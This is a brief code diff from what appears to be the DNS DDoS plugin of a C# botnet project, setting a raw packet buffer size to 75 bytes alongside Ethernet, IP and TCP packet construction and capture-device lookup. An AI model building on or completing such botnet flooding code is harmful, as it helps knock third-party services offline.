@@ -49,7 +49,9 @@ namespace OpenSourceBotNet.Plugins.Engines.DDoS.Plugins.DNS
             ipPacket.PayloadPacket = tcpPacket;
             ethernetPacket.PayloadPacket = ipPacket;
 
-            byte[] bPacket = new byte[???];
+            byte[] bPacket = new byte[75];
+
+            
 
             var devices = CaptureDeviceList.Instance;
 
